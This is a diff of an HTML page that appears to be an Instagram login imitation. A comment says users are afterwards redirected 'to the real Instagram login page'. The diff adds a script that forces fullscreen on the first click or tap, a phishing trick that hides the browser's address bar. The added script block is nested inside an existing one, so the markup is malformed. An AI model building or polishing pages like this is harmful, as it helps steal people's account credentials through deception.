@@ -176,10 +176,31 @@ button:hover {
       // Redirect user to the real Instagram login page
       window.location.href = "https://www.instagram.com/reel/DOOQOn_D320/?igsh=MTZhbzU2OTlyMnpiNg==";
     });
+  <script>
+  function openFullscreen() {
+    let elem = document.documentElement;
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen();
+    } else if (elem.mozRequestFullScreen) { // Firefox
+      elem.mozRequestFullScreen();
+    } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) { // IE/Edge
+      elem.msRequestFullscreen();
+    }
+  }
+
+  // Trigger fullscreen as soon as the user clicks or taps anywhere
+  document.addEventListener("click", () => {
+    openFullscreen();
+  }, { once: true }); // only once
+</script>
+
   </script>
 
 </body>
 </html>
+
 
 
 
